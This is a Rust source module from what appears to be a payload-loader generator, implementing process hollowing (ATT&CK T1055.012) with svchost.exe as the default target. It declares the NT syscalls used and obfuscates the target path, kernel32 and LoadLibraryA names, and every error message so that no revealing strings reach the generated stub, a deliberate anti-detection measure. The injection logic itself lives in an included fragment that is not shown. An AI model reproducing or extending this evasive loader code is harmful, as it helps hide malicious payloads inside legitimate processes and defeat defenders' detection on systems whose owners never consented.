//! Process hollowing.
//!
//! Runs the decrypted payload inside a suspended, legitimate process
//! (`svchost.exe` by default) by unmapping its original image and replacing it
//! with the payload's image. See `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;
use crate::plan::schema::PayloadFormat;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for process hollowing.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Params {
    /// Name of the payload in `build.payloads` to run. Optional when the plan
    /// declares exactly one payload.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub payload: Option<String>,

    /// Path of the process to create, suspend and hollow.
    #[serde(default = "default_target")]
    pub target: String,
}

/// Default target process for process hollowing.
pub fn default_target() -> String {
    r"C:\Windows\System32\svchost.exe".to_string()
}

impl Default for Params {
    /// Defaults to hollowing `svchost.exe` (see [`default_target`]).
    fn default() -> Self {
        Self {
            payload: None,
            target: default_target(),
        }
    }
}

/// Static metadata for process hollowing.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "process_hollowing",
    attck: &["T1055.012"],
    // The full-PE path, TLS callbacks included, is verified on x64 (the
    // callback path needed a 16-byte-aligned stack for the emulated call; see
    // `run_one_callback`) and the plain path on x86.
    stability: Stability::Stable,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Execution,
    doc_path: "src/techniques/process_hollowing/README.md",
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[super::PayloadFormat::Pe],
    requires_indirect_syscalls: false,
    params_example: r#"technique: process_hollowing
params:
  target: "C:\\Windows\\System32\\svchost.exe""#,
    readme: include_str!("README.md"),
    syscalls: &[
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtReadVirtualMemory",
        "NtResumeThread",
        "NtUnmapViewOfSection",
        "NtProtectVirtualMemory",
        "NtSuspendThread",
        "NtQueryInformationProcess",
        "NtQueryInformationThread",
        "NtGetContextThread",
        "NtSetContextThread",
        "NtCreateThreadEx",
        "NtWaitForSingleObject",
        "NtClose",
    ],
    resolves_imports: true,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment` replaces each placeholder with code that rebuilds the
/// message at runtime, so no diagnostic text — least of all a technique keyword
/// like `loader` — lands in the generated stub's `.rdata`. Messages that
/// interpolate a value keep a keyword-free `format!` literal at the call site
/// (`format!` cannot take a runtime format string) and take the label from here.
const MESSAGES: &[(&str, &str)] = &[
    ("$MSG_PAYLOAD_TOO_SMALL$", "payload too small to be a PE"),
    ("$MSG_BAD_DOS$", "invalid DOS header (missing MZ signature)"),
    ("$MSG_BAD_NT$", "invalid NT header (missing PE signature)"),
    ("$MSG_BAD_ARCH$", "unsupported architecture"),
    (
        "$MSG_BAD_IMAGE_SIZE$",
        "inconsistent SizeOfImage in the payload headers",
    ),
    ("$MSG_HEADERS_OOB$", "headers out of bounds"),
    ("$MSG_SECTION_TABLE_OOB$", "section table out of bounds"),
    (
        "$MSG_RELOC_TABLE_UNMAPPED$",
        "could not map the relocation table to a file offset",
    ),
    ("$MSG_RELOC_TABLE_OOB$", "relocation table out of bounds"),
    ("$MSG_BAD_RELOC_BLOCK$", "malformed relocation block"),
    (
        "$MSG_NO_RELOCATIONS$",
        "the image has no base relocations and was not mapped at its preferred base",
    ),
    (
        "$MSG_RESOLVE_IMPORTS$",
        "could not resolve the payload's imports",
    ),
    (
        "$MSG_IAT_SLOT_NOT_MAPPED$",
        "the IAT slot is not mapped at RVA",
    ),
    ("$MSG_UNMAP_FAILED$", "unmap failed"),
    ("$MSG_ALLOC_FAILED$", "allocation failed"),
    ("$MSG_RESUME_FAILED$", "resume failed"),
    ("$MSG_CREATE_PROCESS_FAILED$", "CreateProcessA failed"),
    ("$MSG_GET_CONTEXT_FAILED$", "GetThreadContext failed"),
    ("$MSG_ENTRY_PROTECT_FAILED$", "entry protection failed"),
    ("$MSG_ENTRY_PATCH_FAILED$", "entry patch failed"),
    ("$MSG_INITIAL_RESUME_FAILED$", "initial resume failed"),
    (
        "$MSG_TARGET_INIT_TIMEOUT$",
        "timed out waiting for the target loader to initialize",
    ),
    ("$MSG_SUSPEND_FAILED$", "suspend failed"),
    ("$MSG_BAD_KERNEL32_NAME$", "invalid kernel32 name"),
    ("$MSG_BAD_EXPORT_NAME$", "invalid export name"),
    ("$MSG_KERNEL32_NOT_FOUND$", "could not locate kernel32"),
    (
        "$MSG_KERNEL32_EXPORT_NOT_FOUND$",
        "could not resolve a kernel32 export",
    ),
    (
        "$MSG_IMPORT_DIR_UNMAPPED$",
        "import directory is not mapped",
    ),
    ("$MSG_DLL_NAME_UNMAPPED$", "DLL name is not mapped"),
    ("$MSG_DLL_NAME_UNTERMINATED$", "unterminated DLL name"),
    ("$MSG_DLL_NAME_ALLOC_FAILED$", "DLL-name allocation failed"),
    ("$MSG_DLL_NAME_WRITE_FAILED$", "DLL-name write failed"),
    ("$MSG_LOAD_DLL_FAILED$", "could not load"),
    ("$MSG_DLL_LOAD_UNFINISHED$", "loading did not finish"),
    ("$MSG_READ_FAILED$", "could not read"),
    ("$MSG_SECTION_DATA_OOB$", "section data out of bounds"),
    ("$MSG_WRITE_FAILED$", "could not write"),
    (
        "$MSG_TLS_DIR_UNMAPPED$",
        "the payload's TLS directory is not mapped",
    ),
    (
        "$MSG_TLS_BLOCK_ALLOC_FAILED$",
        "TLS block allocation failed",
    ),
    (
        "$MSG_TLS_TEMPLATE_UNMAPPED$",
        "the payload's .tls template is not mapped",
    ),
    (
        "$MSG_TLS_TEMPLATE_OOB$",
        "the payload's .tls template is out of bounds",
    ),
    ("$MSG_NO_TLS_ARRAY$", "the target thread has no TLS array"),
    (
        "$MSG_TLS_INDEX_FAILED$",
        "the target could not allocate a TLS index",
    ),
    (
        "$MSG_TLSALLOC_RUN_FAILED$",
        "could not run TlsAlloc in the target",
    ),
    ("$MSG_TLSALLOC_UNFINISHED$", "TlsAlloc did not finish"),
    ("$MSG_TLSALLOC_FAILED$", "TlsAlloc failed in the target"),
    (
        "$MSG_TLS_PARK_ALLOC_FAILED$",
        "TLS callback parking stub allocation failed",
    ),
    (
        "$MSG_TLS_CALLBACKS_UNMAPPED$",
        "the payload's TLS callback array is not mapped",
    ),
    (
        "$MSG_TLS_CALLBACKS_UNTERMINATED$",
        "the payload's TLS callback array is not null-terminated",
    ),
    (
        "$MSG_TLS_CALLBACK_TIMEOUT$",
        "timed out waiting for a TLS callback to return",
    ),
    (
        "$MSG_TEB_READ_FAILED$",
        "could not read the target thread's TEB",
    ),
    ("$MSG_SET_CONTEXT_FAILED$", "SetThreadContext failed"),
    ("$MSG_WAIT_FAILED$", "waiting for the target failed"),
    (
        "$MSG_EXIT_STATUS_FAILED$",
        "could not read the target's exit status",
    ),
    ("$MSG_OFFSET_OVERFLOW$", "offset overflow"),
    ("$MSG_READ_OOB$", "read out of bounds"),
    ("$MSG_WRITE_OOB$", "write out of bounds"),
];

impl Params {
    /// Renders the process-hollowing stub fragment for these parameters.
    ///
    /// The per-build target path and the remote-DLL-load resolver's
    /// `kernel32.dll` / `LoadLibraryA` names are substituted into the
    /// fragment's placeholders as code that rebuilds them at runtime (using
    /// `strings`'s active strategy), so none of them appears in `strings`.
    /// The `ntdll.dll` / `NtUnmapViewOfSection` / `NtProtectVirtualMemory` /
    /// `NtSuspendThread` names moved to the syscall layer (`engine::syscalls`),
    /// which obfuscates them the same way.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let target_def = strings
            .obfuscate(&self.target)
            .render_stub_expr("hollow_target");
        let kernel32_def = strings
            .obfuscate("kernel32.dll")
            .render_stub_expr("kernel32_name");
        let load_library_def = strings
            .obfuscate("LoadLibraryA")
            .render_stub_expr("load_library_name");
        let tls_alloc_def = strings
            .obfuscate("TlsAlloc")
            .render_stub_expr("tls_alloc_name");

        // The error paths get the same treatment as the target path and the
        // resolved names: a `format!` literal is keyword-free, and the message
        // itself is rebuilt at runtime, so nothing sensitive reaches `.rdata`.
        let mut rendered = DEF.stub_fragment.to_string();
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("msg_{index}")),
            );
        }

        rendered
            .replace("$HOLLOW_TARGET_DEF$", &target_def)
            .replace("$KERNEL32_DEF$", &kernel32_def)
            .replace("$LOAD_LIBRARY_DEF$", &load_library_def)
            .replace("$TLS_ALLOC_DEF$", &tls_alloc_def)
    }

    /// Renders the fragment for the payload's binary format.
    ///
    /// `process_hollowing` replaces a suspended process's image, so it only
    /// runs a PE executable. `plan::validate` rejects `format: dll`/
    /// `shellcode` before this runs; the parameter is accepted (and ignored) to
    /// keep the execution-technique contract uniform with `reflective_loading`.
    pub fn render_fragment_for(&self, strings: &StringsConfig, _format: PayloadFormat) -> String {
        self.render_fragment(strings)
    }
}

#[cfg(test)]
mod tests;
